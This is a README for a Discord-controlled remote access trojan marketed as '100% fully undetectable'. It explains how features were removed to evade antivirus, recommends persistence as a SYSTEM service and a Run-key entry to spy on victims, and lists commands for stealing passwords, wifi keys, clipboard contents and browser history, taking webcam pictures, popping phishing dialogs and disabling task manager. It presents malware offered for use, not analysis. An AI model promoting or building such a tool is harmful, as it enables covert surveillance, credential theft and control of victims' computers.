# 100-FUD-Discord-RAT
100% fully undetectable discord RAT.

This project is a rework of https://github.com/Sp00p64/DiscordRAT. All variables have been changed/split and all unnecessary features have been removed.  A lot of the features such as av/firewall disable have code with causes AVs to flag the exe/.py file. Keylogginf was also removed, mainly because it was also flagging windows defender, but it was also broken and retreiving the input and output from the console.  Since FUD keyloggers are a dime a dozen and this project is now 100% undetectable, uploading one to the compromised machine would be rather easy.  Since these features are very easily achieved through the command line (shell) which accessible through the RAT anyways, it only made sense.  Tamper protection also make these features obsolete so it only made sense. This is a bare-bones version, however it contains everything necessary to manipulate a compromised computer/ and view its activities.  Being 100% FUD, enables this RAT to be placed on virtually ANYwhere, and can even be run as a hidden service that starts up BEFORE a user logs on as a SYSTEM process, giving administrator features persistently EVERY startup.  I also enabled shell commands to be run in a new "hidden" window, so that the RAT doesnt lag when new commands are executed if you run a shell command that takes a long time to finish executing, meaning multiple commands can be run without having to wait on the ouput.  Below are the list of commands which this project contains.  While condensed, these commands are way more than enough to do just about anything imaginable to a compromised machine, especially if you get creative with command line tools such as psExec, NSudo, advRun, etc. When running as a service or task *pre logon, the screenshot feature will render all black images. It is best to run a persistent SYSTEM service as well as a standard HKCU/././Run user mode version to achieve Admin as well as being able to spy on the victims screen.

~~ !shell = Execute a shell command /Syntax  = "!shell whoami"
~~ !webcampic = Take a picture from the webcam
~~ !admin = Check if program has admin privileges
~~ !history = Get chrome browser history
~~ !download = Download a file from infected computer
~~ !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
~~ !cd = Changes directory
~~ !delete = deletes a file / Syntax = "!delete /path to/the/file.txt"
~~ !clipboard = Retrieve infected computer clipboard content
~~ !process = Get all process
~~ !screenshot = Get the screenshot of the user's current screen
~~ !exit = Exit program
~~ !crit = Make this run as a critical process
~~ !uncrit Make this run as a normnal process
~~ !kill = Kill a victim or all vics / Syntax = "!kill victim-3" or "!kill all"
~~ !passwords = grab all passwords
~~ !displaydir = display all items in current dir
~~ !currentdir = display the current dir
~~ !systime = display system date and time
~~ !killproc = kill a process by name / syntax = "!killproc process.exe"
~~ !phish = attempt to phish password by poping up a password dialog
~~ !hide = hide the file by changing the attribute to hidden
~~ !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
~~ !dtaskmgr = disable task manager(Admin rights are required)
~~ !etaskmgr = enable task manager(Admin rights are required)
~~ !getwifipass = get all the wifi passwords on the current device(Admin rights are required)
~~ !persist = add file to startup (Admin rights are required)
